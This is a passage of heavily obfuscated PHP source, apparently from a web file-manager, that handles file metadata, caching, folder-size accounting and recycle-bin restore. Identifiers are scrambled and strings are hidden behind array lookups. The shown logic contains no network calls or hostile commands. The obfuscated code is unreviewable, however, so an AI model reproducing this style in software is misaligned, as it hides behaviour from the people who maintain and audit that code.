Cache::set($Ô¾Ú½, $ÑŠµŸª–); } return $ÑŠµŸª–; } if (!$Ü“Ï’ÎĞ[$û˜ÈŞôú[87]]) { return $û˜ÈŞôú[12]; } return IO::getContent($Ü“Ï’ÎĞ[$û˜ÈŞôú[87]]); } public function setDesc($«ìéÑ–«, $€çøÉÌ») { $âï–¸¿” =& $_SERVER[¹Éµ„ºå]; Model($âï–¸¿”[655])->eventAddDesc($«ìéÑ–«, $€çøÉÌ»); return $this->metaSet($«ìéÑ–«, $âï–¸¿”[540], $€çøÉÌ»); } public function setContent($ôıòıúó, $÷æ”äš = '') { $Ù³µŒ±ï =& $_SERVER[¹Éµ„ºå]; $Ùéì©ÍÍ = $this->sourceInfo($ôıòıúó); $‹×áÊİõ = $this->fileInfoGet($ôıòıúó); if (!$‹×áÊİõ || !$Ùéì©ÍÍ) { return !1; } $®Ç’²ßú = KodIO::ioFileDriverGet($Ù³µŒ±ï[498] . $ôıòıúó . $Ù³µŒ±ï[402]); $µıÙÇƒƒ = Model($Ù³µŒ±ï[560])->addFileByContent($÷æ”äš, $®Ç’²ßú, $Ùéì©ÍÍ[$Ù³µŒ±ï[32]]); if (!$µıÙÇƒƒ) { return !1; } $Ï¤åÅ» = $this->fileHistory($Ùéì©ÍÍ, $µıÙÇƒƒ[$Ù³µŒ±ï[557]], $µıÙÇƒƒ[$Ù³µŒ±ï[79]]); if (!$Ï¤åÅ») { return Model($Ù³µŒ±ï[560])->remove($µıÙÇƒƒ[$Ù³µŒ±ï[557]]); } $this->folderSizeReset($Ùéì©ÍÍ[$Ù³µŒ±ï[190]]); return !0; } public function fileSubstr($šÁÚíÄ, $ÃØ˜ã¬ò, $§³ óÄŠ) { $ÚØÈ¥ß¸ = $this->fileInfoGet($šÁÚíÄ); if (!$ÚØÈ¥ß¸) { return !1; } return IO::fileSubstr($ÚØÈ¥ß¸[$_SERVER[¹Éµ„ºå][87]], $ÃØ˜ã¬ò, $§³ óÄŠ); } public function fileInfoGet($ÂÎø†«¸) { $™µÏéàì =& $_SERVER[¹Éµ„ºå]; $ÚŞìøû€ = $this->sourceInfo($ÂÎø†«¸); if (!$ÚŞìøû€ || $ÚŞìøû€[$™µÏéàì[500]]) { return !1; } $…Û²õöƒ = $™µÏéàì[564] . $ÚŞìøû€[$™µÏéàì[557]]; $ä‡ÔãÉÚ = _get(self::$cacheFileInfo, $…Û²õöƒ); if ($ä‡ÔãÉÚ) { return $ä‡ÔãÉÚ; } $—×€¦÷õ = Model($™µÏéàì[560])->fileInfo($ÚŞìøû€[$™µÏéàì[557]]); if ($—×€¦÷õ) { $—×€¦÷õ[$™µÏéàì[32]] = $ÚŞìøû€[$™µÏéàì[32]]; } self::$cacheFileInfo[$…Û²õöƒ] = $—×€¦÷õ; return $—×€¦÷õ; } private function folderChildrenNumber($ªÖã´ª) { $¬ßòæ×Ù =& $_SERVER[¹Éµ„ºå]; $ƒÄîş£– = $this->sourceInfo($ªÖã´ª); $©æœ¯‘ï = array($¬ßòæ×Ù[674] => array($¬ßòæ×Ù[635], $ƒÄîş£–[$¬ßòæ×Ù[604]] . $ªÖã´ª . $¬ßòæ×Ù[636]), $¬ßòæ×Ù[671] => $ƒÄîş£–[$¬ßòæ×Ù[589]], $¬ßòæ×Ù[519] => intval($ƒÄîş£–[$¬ßòæ×Ù[520]]), $¬ßòæ×Ù[668] => 1); $ƒ×®¡á´ = $this->where($©æœ¯‘ï)->count(); $•­ò³©» = $this->where($©æœ¯‘ï)->where(array($¬ßòæ×Ù[668] => 0))->count(); return array($¬ßòæ×Ù[83] => $•­ò³©», $¬ßòæ×Ù[84] => $ƒ×®¡á´); } public function pathInfo($‹¯Â×ÓÙ, $®™¸¤âÍ = false) { $ßŒ © =& $_SERVER[¹Éµ„ºå]; $®™¸¤âÍ = !1; $‹¯Â×ÓÙ = intval($‹¯Â×ÓÙ); if (!$‹¯Â×ÓÙ) { return !1; } $ì‚Ù¦¸Ò = $ßŒ ©[548] . intval($®™¸¤âÍ) . $ßŒ ©[476] . $‹¯Â×ÓÙ; $æëº©ß = _get(self::$cachePathInfo, $ì‚Ù¦¸Ò); if ($æëº©ß) { return $æëº©ß; } $Ëñ¶´¢ˆ = $this->sourceInfo($‹¯Â×ÓÙ); if (!$Ëñ¶´¢ˆ) { return !1; } $Ëñ¶´¢ˆ = $this->_listDataApplyItem($Ëñ¶´¢ˆ, $®™¸¤âÍ); self::$cachePathInfo[$ì‚Ù¦¸Ò] = $Ëñ¶´¢ˆ; return $Ëñ¶´¢ˆ; } public static $cachePathInfoMore = array(); public function pathInfoMore($Èè××…Œ) { $øœÕà´à =& $_SERVER[¹Éµ„ºå]; $âÖââ“‚ = _get(self::$cachePathInfoMore, $Èè××…Œ); if ($âÖââ“‚) { return $âÖââ“‚; } $»£Ş¢©ı = $this->pathInfo($Èè××…Œ); if (!$»£Ş¢©ı) { return !1; } if ($»£Ş¢©ı[$øœÕà´à[500]] == $øœÕà´à[91]) { $»£Ş¢©ı[$øœÕà´à[82]] = $this->folderChildrenNumber($Èè××…Œ); } self::$cachePathInfoMore[$Èè××…Œ] = $»£Ş¢©ı; return $»£Ş¢©ı; } public function sourceInfo($„üè·©Å) { $ëí¸­—– =& $_SERVER[¹Éµ„ºå]; if (!$„üè·©Å) { return array(); } $„üè·©Å = intval($„üè·©Å); $ë€È¤© = $ëí¸­—–[547] . $„üè·©Å; $ëÑº–•Ç = _get(self::$cacheSourceInfo, $ë€È¤©); if ($ëÑº–•Ç) { return $ëÑº–•Ç; } $òæÖôÇ = $this->where(array($ëí¸­—–[191] => $„üè·©Å))->find(); self::$cacheSourceInfo[$ë€È¤©] = $òæÖôÇ; return self::$cacheSourceInfo[$ë€È¤©]; } public function sourceCacheClear($Œ•‚ş™ = false) { self::cacheClear($Œ•‚ş™); } public static function cacheClear($°ÃÕªí = false) { $¾Ü—ñ¸Ü =& $_SERVER[¹Éµ„ºå]; if ($°ÃÕªí == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$¾Ü—ñ¸Ü[547] . $°ÃÕªí]); unset(self::$cachePathInfoMore[$°ÃÕªí]); unset(self::$cachePathInfo[$¾Ü—ñ¸Ü[2487] . $°ÃÕªí]); unset(self::$cachePathInfo[$¾Ü—ñ¸Ü[2488] . $°ÃÕªí]); } public function metaSet($àş¼‚—ß, $æåö‰™š = null, $¬Œ×êˆÉ = null) { $œÌ€Şß = parent::metaSet($àş¼‚—ß, $æåö‰™š, $¬Œ×êˆÉ); if ($œÌ€Şß) { $this->sourceCacheClear($àş¼‚—ß); } return $œÌ€Şß; } public function pathInfoByPath($“ÍÎñÙ›, $ï¤¾ØŒì) { $ì…°„³” =& $_SERVER[¹Éµ„ºå]; $†°—Ø©õ = !$ï¤¾ØŒì ? array() : explode($ì…°„³”[8], trim($ï¤¾ØŒì, $ì…°„³”[8])); $²ˆúÈï° = intval($“ÍÎñÙ›); foreach ($†°—Ø©õ as $½õ„Ùæš) { $ÁëÕï±¼ = array($ì…°„³”[190] => $²ˆúÈï°, $ì…°„³”[32] => $½õ„Ùæš); $É”®­Ñë = $this->field($ì…°„³”[2489])->where($ÁëÕï±¼)->select(); if (!$É”®­Ñë) { return !1; } $É”®­Ñë = array_sort_by($É”®­Ñë, $ì…°„³”[520]); $²ˆúÈï° = intval($É”®­Ñë[0][$ì…°„³”[191]]); } $¬ªÁ÷¾— = $this->sourceInfo($²ˆúÈï°); $this->pathInfoFilter($¬ªÁ÷¾—); return $¬ªÁ÷¾—; } protected function updateModifyTime($Ëèüİòß) { $Ü‡Í®Ùî =& $_SERVER[¹Éµ„ºå]; $ñÍ½‹ÙÕ = KodUser::id(); if (!$Ëèüİòß) { return; } if (!is_array($Ëèüİòß)) { $Ëèüİòß = array($Ëèüİòß); } foreach ($Ëèüİòß as $¥üé¾Î¸ => $Âú›Å˜ã) { $Ëèüİòß[$¥üé¾Î¸] = intval($Âú›Å˜ã); $this->sourceCacheClear($Âú›Å˜ã); } $’Üõ•ÉÔ = array($Ü‡Í®Ùî[191] => array($Ü‡Í®Ùî[7], $Ëèüİòß)); $îÍ–õ‘” = array($Ü‡Í®Ùî[673] => $ñÍ½‹ÙÕ, $Ü‡Í®Ùî[513] => time()); $this->where($’Üõ•ÉÔ)->save($îÍ–õ‘”); } public function folderSizeReset($¨©‰¢„, $âÆµÉÓØ = false) { $ß¸ĞÃß =& $_SERVER[¹Éµ„ºå]; if ($this->statusIgnoreResetSpace) { return; } if (!$¨©‰¢„) { return; } $‡õäŠÁö = $this->sourceInfo($¨©‰¢„); $ÄÏË¡¢™ = $ß¸ĞÃß[2490] . $¨©‰¢„; if (!$‡õäŠÁö || !$‡õäŠÁö[$ß¸ĞÃß[191]]) { return; } CacheLock::lock($ÄÏË¡¢™, 20); if ($âÆµÉÓØ === !1) { $this->sourceCacheClear($¨©‰¢„); $‡õäŠÁö = $this->sourceInfo($¨©‰¢„); $«Ÿ“æ”³ = array($ß¸ĞÃß[492] => $¨©‰¢„, $ß¸ĞÃß[519] => 0); $ğš¡ŒÊÃ = $this->where($«Ÿ“æ”³)->sum($ß¸ĞÃß[79]); $âÆµÉÓØ = intval($ğš¡ŒÊÃ) - intval($‡õäŠÁö[$ß¸ĞÃß[79]]); } if ($âÆµÉÓØ == 0) { return CacheLock::unlock($ÄÏË¡¢™); } $‚—©Úû÷ = $this->parentLevelArray($‡õäŠÁö[$ß¸ĞÃß[604]]); if (!$‚—©Úû÷) { $‚—©Úû÷ = array(); } $‚—©Úû÷[] = $‡õäŠÁö[$ß¸ĞÃß[191]]; $«Ÿ“æ”³ = array($ß¸ĞÃß[191] => array($ß¸ĞÃß[507], $‚—©Úû÷)); if ($âÆµÉÓØ < 0) { $«Ÿ“æ”³[$ß¸ĞÃß[79]] = array($ß¸ĞÃß[1172], abs($âÆµÉÓØ)); } $this->where($«Ÿ“æ”³)->setAdd($ß¸ĞÃß[79], $âÆµÉÓØ); CacheLock::unlock($ÄÏË¡¢™); if (!$‡õäŠÁö[$ß¸ĞÃß[589]] || $‡õäŠÁö[$ß¸ĞÃß[589]] == $ß¸ĞÃß[228]) { return; } $âÓ‹Óı­ = $ß¸ĞÃß[2491] . $‡õäŠÁö[$ß¸ĞÃß[188]] . $ß¸ĞÃß[4] . $‡õäŠÁö[$ß¸ĞÃß[589]]; $Úã”õÛË = array($‡õäŠÁö[$ß¸ĞÃß[188]], $‡õäŠÁö[$ß¸ĞÃß[589]]); TaskRun::timeLimitCall($âÓ‹Óı­, $ß¸ĞÃß[2492], $Úã”õÛË, 1.5); } public function folderSizeResetChildren($şï»¢°Ã) { $ÒçÀ¼Ñ‡ =& $_SERVER[¹Éµ„ºå]; $this->sourceCacheClear($şï»¢°Ã); $ÓèÙÑ§Ş = $this->sourceInfo($şï»¢°Ã); if (!$ÓèÙÑ§Ş) { return; } $Òù„¯ì­ = array($ÒçÀ¼Ñ‡[668] => 1, $ÒçÀ¼Ñ‡[671] => $ÓèÙÑ§Ş[$ÒçÀ¼Ñ‡[589]], $ÒçÀ¼Ñ‡[674] => array($ÒçÀ¼Ñ‡[635], $ÓèÙÑ§Ş[$ÒçÀ¼Ñ‡[604]] . $şï»¢°Ã . $ÒçÀ¼Ñ‡[636])); $©¤·óÕë = $ÒçÀ¼Ñ‡[2493]; $ş……•å = $this->field($©¤·óÕë)->where($Òù„¯ì­)->select(); $Òù„¯ì­[$ÒçÀ¼Ñ‡[500]] = 0; $©ø‡ŠŒĞ = $this->field($©¤·óÕë)->where($Òù„¯ì­)->select(); if (!$©ø‡ŠŒĞ) { return; } $ş……•å[] = $ÓèÙÑ§Ş; $ş……•å = array_to_keyvalue($ş……•å, $ÒçÀ¼Ñ‡[191]); foreach ($ş……•å as $‹Õ¨ËÑ => $Èş´‘ì‚) { $ş……•å[$‹Õ¨ËÑ][$ÒçÀ¼Ñ‡[2494]] = $ş……•å[$‹Õ¨ËÑ][$ÒçÀ¼Ñ‡[79]]; $ş……•å[$‹Õ¨ËÑ][$ÒçÀ¼Ñ‡[79]] = 0; } foreach ($©ø‡ŠŒĞ as $Èş´‘ì‚) { $íáˆæº = $Èş´‘ì‚[$ÒçÀ¼Ñ‡[190]] . $ÒçÀ¼Ñ‡[12]; if (!isset($ş……•å[$íáˆæº])) { continue; } if ($Èş´‘ì‚[$ÒçÀ¼Ñ‡[520]] == $ş……•å[$íáˆæº][$ÒçÀ¼Ñ‡[520]]) { $ş……•å[$íáˆæº][$ÒçÀ¼Ñ‡[79]] += $Èş´‘ì‚[$ÒçÀ¼Ñ‡[79]]; } } foreach ($ş……•å as $Èş´‘ì‚) { $Ùâ²†üĞ = $this->parentLevelArray($Èş´‘ì‚[$ÒçÀ¼Ñ‡[604]]); foreach ($Ùâ²†üĞ as $íáˆæº) { $íáˆæº = $íáˆæº . $ÒçÀ¼Ñ‡[12]; if (!isset($ş……•å[$íáˆæº])) { continue; } if ($Èş´‘ì‚[$ÒçÀ¼Ñ‡[520]] == $ş……•å[$íáˆæº][$ÒçÀ¼Ñ‡[520]]) { $ş……•å[$íáˆæº][$ÒçÀ¼Ñ‡[79]] += $Èş´‘ì‚[$ÒçÀ¼Ñ‡[79]]; } } } $·ÇÆ±• = array(); foreach ($ş……•å as $Èş´‘ì‚) { if ($Èş´‘ì‚[$ÒçÀ¼Ñ‡[79]] == $Èş´‘ì‚[$ÒçÀ¼Ñ‡[2494]]) { continue; } $·ÇÆ±•[] = array($ÒçÀ¼Ñ‡[191], $Èş´‘ì‚[$ÒçÀ¼Ñ‡[191]], $ÒçÀ¼Ñ‡[79], $Èş´‘ì‚[$ÒçÀ¼Ñ‡[79]]); } $this->saveAll($·ÇÆ±•); } public function userSpaceReset($¨‹¼Øææ = false) { $œË²âè =& $_SERVER[¹Éµ„ºå]; $©®¸Æ• = $this->where(array($œË²âè[188] => self::TYPE_USER, $œË²âè[589] => $¨‹¼Øææ, $œË²âè[500] => 0))->sum($œË²âè[79]); $©®¸Æ• = !$©®¸Æ• || $©®¸Æ• <= 0 ? 0 : $©®¸Æ•; Model($œË²âè[597])->userEdit($¨‹¼Øææ, array($œË²âè[2158] => $©®¸Æ•)); } public function targetSpaceUpdate($ïàº¸«, $Å¯”å›Ä) { $ûçí´ÈÄ =& $_SERVER[¹Éµ„ºå]; if (!$Å¯”å›Ä) { return; } if (!in_array($ïàº¸«, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $—ğÁÌ‰ = $this->targetSpaceSize($ïàº¸«, $Å¯”å›Ä); if ($ïàº¸« == self::TYPE_USER) { Model($ûçí´ÈÄ[597])->userEdit($Å¯”å›Ä, array($ûçí´ÈÄ[2158] => $—ğÁÌ‰)); } else { if ($ïàº¸« == self::TYPE_GROUP) { Model($ûçí´ÈÄ[605])->groupEdit($Å¯”å›Ä, array($ûçí´ÈÄ[2158] => $—ğÁÌ‰)); } } } public function targetSpaceSize($ Î´ªşù, $Ôù×»¼) { $ë™Âí©ß =& $_SERVER[¹Éµ„ºå]; $âèûÒË’ = 0; $çû»·ûğ = $this->targetSourceRoot($ Î´ªşù, $Ôù×»¼, !0); foreach ($çû»·ûğ as $¾Å§ü­ö) { if (!$¾Å§ü­ö) { continue; } $âèûÒË’ += floatval($¾Å§ü­ö[$ë™Âí©ß[79]]); $˜Áû¹’ = array($ë™Âí©ß[674] => array($ë™Âí©ß[635], $ë™Âí©ß[613] . $¾Å§ü­ö[$ë™Âí©ß[191]] . $ë™Âí©ß[636])); $÷Ó˜Ïùó = Model($ë™Âí©ß[518])->field($ë™Âí©ß[506])->where($˜Áû¹’)->select(); $÷Ó˜Ïùó = array_to_keyvalue($÷Ó˜Ïùó, $ë™Âí©ß[12], $ë™Âí©ß[191]); $÷Ó˜Ïùó = array_unique(array_filter($÷Ó˜Ïùó)); if ($÷Ó˜Ïùó) { $˜Áû¹’ = array($ë™Âí©ß[506] => array($ë™Âí©ß[507], $÷Ó˜Ïùó)); $âèûÒË’ += floatval($this->where($˜Áû¹’)->sum($ë™Âí©ß[79])); } } $âèûÒË’ = !$âèûÒË’ || $âèûÒË’ <= 0 ? 0 : $âèûÒË’; return $âèûÒË’; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($É óéâö) { return $this->fileTypeProfile($É óéâö, SourceModel::TYPE_USER); } public function groupFileTypeProfile($„üß¡„Î) { return $this->fileTypeProfile($„üß¡„Î, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ü„òÜÑø, $íªîüÒá) { $«Ú§õµñ =& $_SERVER[¹Éµ„ºå]; $ÊÀÌƒ§¬ = $«Ú§õµñ[2495] . $ü„òÜÑø . $«Ú§õµñ[11] . $íªîüÒá; $™£è‘‡ø = Cache::get($ÊÀÌƒ§¬); if ($™£è‘‡ø) { return $™£è‘‡ø; } $ÁÇ×Ã¾› = array($«Ú§õµñ[668] => 0); if ($ü„òÜÑø != !1) { $ÁÇ×Ã¾›[$«Ú§õµñ[589]] = $ü„òÜÑø; $ÁÇ×Ã¾›[$«Ú§õµñ[188]] = $íªîüÒá; } $£ßŠ½“ = array(); $—õí°ª = $this->field(array($«Ú§õµñ[940] => $«Ú§õµñ[941], $«Ú§õµñ[942] => $«Ú§õµñ[79]))->where($ÁÇ×Ã¾›)->find(); $£ßŠ½“[$«Ú§õµñ[2496]] = array($«Ú§õµñ[2497] => LNG($«Ú§õµñ[2496]), $«Ú§õµñ[2498] => intval($—õí°ª[$«Ú§õµñ[941]]), $«Ú§õµñ[640] => intval($—õí°ª[$«Ú§õµñ[79]])); $ôùæãç = KodIO::fileTypeList(); foreach ($ôùæãç as $Ä™ïšïÍ => $ûÀï›§) { $ÁÇ×Ã¾›[$«Ú§õµñ[501]] = $this->fileTypeWhere($Ä™ïšïÍ); $—õí°ª = $this->field(array($«Ú§õµñ[940] => $«Ú§õµñ[941], $«Ú§õµñ[942] => $«Ú§õµñ[79]))->where($ÁÇ×Ã¾›)->find(); $£ßŠ½“[$Ä™ïšïÍ] = array($«Ú§õµñ[2497] => $ûÀï›§[$«Ú§õµñ[32]], $«Ú§õµñ[2498] => intval($—õí°ª[$«Ú§õµñ[941]]), $«Ú§õµñ[640] => intval($—õí°ª[$«Ú§õµñ[79]])); } Cache::set($ÊÀÌƒ§¬, $£ßŠ½“, 1200); return $£ßŠ½“; } public function fileNameExist($•”ÎöØ‡, $”Ìîãú¨) { $‚Íï™’œ =& $_SERVER[¹Éµ„ºå]; $™Úíıèµ = $this->field($‚Íï™’œ[2499])->where(array($‚Íï™’œ[190] => $•”ÎöØ‡, $‚Íï™’œ[32] => $”Ìîãú¨, $‚Íï™’œ[520] => 0))->find(); return is_array($™Úíıèµ) ? $™Úíıèµ[$‚Íï™’œ[191]] : !1; } public function childList($ıßÑ×ı) { $ã§ì¥ı€ =& $_SERVER[¹Éµ„ºå]; $İü‘† = $ã§ì¥ı€[2470] . $ıßÑ×ı; if (isset(self::$cacheChildList[$İü‘†])) { return self::$cacheChildList[$İü‘†]; } $÷İ©ú” = array($ã§ì¥ı€[190] => intval($ıßÑ×ı), $ã§ì¥ı€[520] => 0); $¶µà®—‹ = $this->where($÷İ©ú”)->select(); $¶µà®—‹ = $¶µà®—‹ ? $¶µà®—‹ : array(); self::$cacheChildList[$İü‘†] = $¶µà®—‹; foreach ($¶µà®—‹ as $¸–Ï•ı) { $İü‘† = $ã§ì¥ı€[547] . $¸–Ï•ı[$ã§ì¥ı€[191]]; self::$cacheSourceInfo[$İü‘†] = $¸–Ï•ı; } return $¶µà®—‹; } public function fileNameAuto($ÈÙ‘Ö», $»´›õ×£, $ØåÍíÕâ = REPEAT_RENAME, $ïÓÛùï = false) { $‚‚íº™† =& $_SERVER[¹Éµ„ºå]; $æŒÆ¾Èô = get_path_ext($»´›õ×£); $©‚í÷ = $æŒÆ¾Èô ? get_path_ext_name($»´›õ×£) . $‚‚íº™†[2500] . $æŒÆ¾Èô : $»´›õ×£ . $‚‚íº™†[474]; $ï–èÊüó = array($‚‚íº™†[190] => $ÈÙ‘Ö», $‚‚íº™†[520] => 0, $‚‚íº™†[32] => array($‚‚íº™†[473], $©‚í÷)); $°»‚©€ = $this->field($‚‚íº™†[32])->where($ï–èÊüó)->select(); $õ¸ä¨îé = array_to_keyvalue($°»‚©€, $‚‚íº™†[12], $‚‚íº™†[32]); return $this->fileNameAutoGet($õ¸ä¨îé, $»´›õ×£, $ØåÍíÕâ, $ïÓÛùï); } public function fileNameAutoGet($¶­³ÅÜÚ, $ÀôİÍ, $…Å›Á¢ü, $ØÔ¥öåè) { $äı©ƒ¶Ö =& $_SERVER[¹Éµ„ºå]; if ($…Å›Á¢ü == REPEAT_REPLACE || !$¶­³ÅÜÚ || !in_array_not_case($ÀôİÍ, $¶­³ÅÜÚ) || $ØÔ¥öåè && $…Å›Á¢ü != REPEAT_RENAME_FOLDER) { return $ÀôİÍ; } if ($…Å›Á¢ü == REPEAT_SKIP) { return !1; } $ÌÍü¦ßæ = $äı©ƒ¶Ö[10] . get_path_ext($ÀôİÍ); $ÌÍü¦ßæ = $ÌÍü¦ßæ == $äı©ƒ¶Ö[10] || $ØÔ¥öåè ? $äı©ƒ¶Ö[12] : $ÌÍü¦ßæ; for ($ã‚«Å¸• = 1; $ã‚«Å¸• <= count($¶­³ÅÜÚ) + 1; $ã‚«Å¸•++) { $”ÔšùĞ„ = substr($ÀôİÍ, 0, strlen($ÀôİÍ) - strlen($ÌÍü¦ßæ)); $ã„Ö›êı = $”ÔšùĞ„ . "\x28{$ã‚«Å¸•}\51{$ÌÍü¦ßæ}"; if (!in_array_not_case($ã„Ö›êı, $¶­³ÅÜÚ)) { return $ã„Ö›êı; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\x75\x72\x63\x65\x5f\x72\x65\143\x79\143\x6c\x65"; protected $dataAuto = array(array("\143\x72\x65\x61\164\x65\x54\151\x6d\x65", "\x74\x69\x6d\145", "\151\x6e\x73\x65\162\164", "\146\x75\x6e\143\164\151\x6f\156")); public function listData($ğÛÆğò« = false) { $öí©şÊ‹ =& $_SERVER[¹Éµ„ºå]; $ğÛÆğò« = $ğÛÆğò« ? $ğÛÆğò« : USER_ID; $´êÔµ³ = $this->where(array($öí©şÊ‹[1956] => $ğÛÆğò«))->select(); return array_to_keyvalue($´êÔµ³, $öí©şÊ‹[12], $öí©şÊ‹[191]); } public function moveToRecycle($öÛºÉƒ) { $ç¢˜¦ó‹ =& $_SERVER[¹Éµ„ºå]; $€ÖîÆ€­ = Model($ç¢˜¦ó‹[1523]); $‰¤ÑÓÌ = $€ÖîÆ€­->sourceInfo($öÛºÉƒ); if (!$‰¤ÑÓÌ || $‰¤ÑÓÌ[$ç¢˜¦ó‹[520]] == $ç¢˜¦ó‹[91]) { return; } $­†¸úÛı = array($ç¢˜¦ó‹[506] => $öÛºÉƒ, $ç¢˜¦ó‹[1956] => USER_ID, $ç¢˜¦ó‹[670] => $‰¤ÑÓÌ[$ç¢˜¦ó‹[188]], $ç¢˜¦ó‹[671] => $‰¤ÑÓÌ[$ç¢˜¦ó‹[589]], $ç¢˜¦ó‹[674] => $‰¤ÑÓÌ[$ç¢˜¦ó‹[604]]); $this->add($­†¸úÛı); $this->recycleMove($öÛºÉƒ, 1); if ($‰¤ÑÓÌ[$ç¢˜¦ó‹[500]] == $ç¢˜¦ó‹[91]) { $ÙµèÉËÃ = array($ç¢˜¦ó‹[674] => array($ç¢˜¦ó‹[635], $‰¤ÑÓÌ[$ç¢˜¦ó‹[604]] . $öÛºÉƒ . $ç¢˜¦ó‹[636])); $€ÖîÆ€­->where($ÙµèÉËÃ)->setField($ç¢˜¦ó‹[520], 1); } } public function clear() { $this->remove(!1); } public function remove($×ÒËì‰Ò = false, $ççšÖÉ± = false) { $À¡‚—› =& $_SERVER[¹Éµ„ºå]; $ççšÖÉ± = $ççšÖÉ± ? $ççšÖÉ± : USER_ID; $À“”å× = Model($À¡‚—›[1523]); $•°ÂõÆ = $this->listData($ççšÖÉ±); $×ÒËì‰Ò = $×ÒËì‰Ò === !1 ? !1 : $×ÒËì‰Ò; $ıûÕœÉ = array(); foreach ($•°ÂõÆ as $ù¢·ÈÓâ) { if ($×ÒËì‰Ò != !1 && !in_array($ù¢·ÈÓâ, $×ÒËì‰Ò)) { continue; } $Î«ôÖè­ = $À“”å×->sourceInfo($ù¢·ÈÓâ); $À“”å×->remove($ù¢·ÈÓâ, !1); $£Ï‹ºÒ¢ = $Î«ôÖè­[$À¡‚—›[188]] . $À¡‚—›[11] . $Î«ôÖè­[$À¡‚—›[589]]; $ıûÕœÉ[$£Ï‹ºÒ¢] = array($À¡‚—›[670] => $Î«ôÖè­[$À¡‚—›[188]], $À¡‚—›[589] => $Î«ôÖè­[$À¡‚—›[589]]); $this->where(array($À¡‚—›[191] => $ù¢·ÈÓâ))->delete(); } foreach ($ıûÕœÉ as $öÌ»Éí¸) { $À“”å×->targetSpaceUpdate($öÌ»Éí¸[$À¡‚—›[188]], $öÌ»Éí¸[$À¡‚—›[589]]); } } public function restore($†×Ğ™ÛÍ = false) { $äÃê¹Òø = $this->listData(); $this->_restoreSource($äÃê¹Òø, $†×Ğ™ÛÍ); } public function removeUserAll($œå¹äŠ€) { $this->remove(!1, $œå¹äŠ€); } public function restoreItem($Ş¹‡©Â÷) { $this->_restoreSource(array($Ş¹‡©Â÷), array($Ş¹‡©Â÷)); } private function _restoreSource($˜Ñ Ìé, $¹ÍÓÚ õ) { $ô××¹Š =& $_SERVER[¹Éµ„ºå]; $™‡ªƒ‰Û = Model($ô××¹Š[1523]); $¹ÍÓÚ õ = $¹ÍÓÚ õ == !1 ? !1 : $¹ÍÓÚ õ; if (!$˜Ñ Ìé) { return !0; } $½ÅÖÊ¯ = array(); foreach ($˜Ñ Ìé as $å’ƒı´Â) { if ($¹ÍÓÚ õ != !1 && !in_array($å’ƒı´Â, $¹ÍÓÚ õ)) { continue; } $‘¹¢ŞıÏ = $™‡ªƒ‰Û->sourceInfo($å’ƒı´Â); $„“ï ºû = $™‡ªƒ‰Û->sourceInfo($‘¹¢ŞıÏ[$ô××¹Š[190]]); if ($„“ï ºû[$ô××¹Š[520]] == $ô××¹Š[91]) { continue; } $™‡ªƒ‰Û->lockMoveStart($å’ƒı´Â); $this->recycleMove($å’ƒı´Â, 0); if ($‘¹¢ŞıÏ[$ô××¹Š[500]] == $ô××¹Š[91]) { $ñ™ê™ = array($ô××¹Š[674] => array($ô××¹Š[635], $‘¹¢ŞıÏ[$ô××¹Š[604]] . $å’ƒı´Â . $ô××¹Š[636])); $™‡ªƒ‰Û->where($ñ™ê™)->setField($ô××¹Š[520], 0); $this->restoreFolderChildren($å’ƒı´Â, $˜Ñ Ìé); } $this->where(array($ô××¹Š[191] => $å’ƒı´Â))->delete(); $™‡ªƒ‰Û->folderSizeReset($‘¹¢ŞıÏ[$ô××¹Š[190]]); $½ÅÖÊ¯[] = $‘¹¢ŞıÏ[$ô××¹Š[190]]; if ($‘¹¢ŞıÏ[$ô××¹Š[500]] == $ô××¹Š[91]) { $½ÅÖÊ¯[] = $å’ƒı´Â; } $™‡ªƒ‰Û->lockMoveEnd($å’ƒı´Â); } $™‡ªƒ‰Û->updateModifyTime($½ÅÖÊ¯); } private function restoreFolderChildren($ÏÈş¦Œ, $¤Èı) { $ƒ½¡À¿ =& $_SERVER[¹Éµ„ºå]; $ôÈĞ…™û = Model($ƒ½¡À¿[1523]); $‘Ô‚ùÆ = array($ƒ½¡À¿[191] => array($ƒ½¡À¿[7], array())); foreach ($¤Èı as $³è†¢àÕ) { if ($³è†¢àÕ == $ÏÈş¦Œ) { continue; } if (!$ôÈĞ…™û->isParentOf($ÏÈş¦Œ, $³è†¢àÕ)) { continue; } $Êõü¸Í = $ôÈĞ…™û->sourceInfo($³è†¢àÕ); if ($Êõü¸Í[$ƒ½¡À¿[500]] == $ƒ½¡À¿[91]) { $‘Ô‚ùÆ[] = array($ƒ½¡À¿[674] => array($ƒ½¡À¿[635], $Êõü¸Í[$ƒ½¡À¿[604]] . $³è†¢àÕ . $ƒ½¡À¿[636])); } else { $‘Ô‚ùÆ[$ƒ½¡À¿[191]][1][] = $³è†¢àÕ; } } if (!$‘Ô‚ùÆ[$ƒ½¡À¿[191]][1]) { unset($‘Ô‚ùÆ[$ƒ½¡À¿[191]]); } if (!$‘Ô‚ùÆ) { return; } if (is_array($‘Ô‚ùÆ[$ƒ½¡À¿[191]]) && is_array($‘Ô‚ùÆ[$ƒ½¡À¿[191]][1])) { $‘Ô‚ùÆ[$ƒ½¡À¿[191]][1] = array_unique($‘Ô‚ùÆ[$ƒ½¡À¿[191]][1]); } $‘Ô‚ùÆ[$ƒ½¡À¿[1157]] = $ƒ½¡À¿[2273]; $ôÈĞ…™û->where($‘Ô‚ùÆ)->setField($ƒ½¡À¿[520], 1); } private function recycleMove($…”ĞÚñî, $ÚÅ·üå© = 1) { $ì«‚ÂÎû =& $_SERVER[¹Éµ„ºå]; $üÉªİÉ¹ = Model($ì«‚ÂÎû[1523]); $ĞÍÜÍºï = Model($ì«‚ÂÎû[2501]); $œµ·²ÃÁ = array($ì«‚ÂÎû[191] => $…”ĞÚñî); if ($ÚÅ·üå©) { $üÉªİÉ¹->where($œµ·²ÃÁ)->setField($ì«‚ÂÎû[520], 1); $ĞÍÜÍºï->eventRecycle($…”ĞÚñî, $ì«‚ÂÎû[2502]); } else { $ñõ•Ğ‚¾ = $üÉªİÉ¹->where($œµ·²ÃÁ)->find(); $ñçÎ¨İÎ = 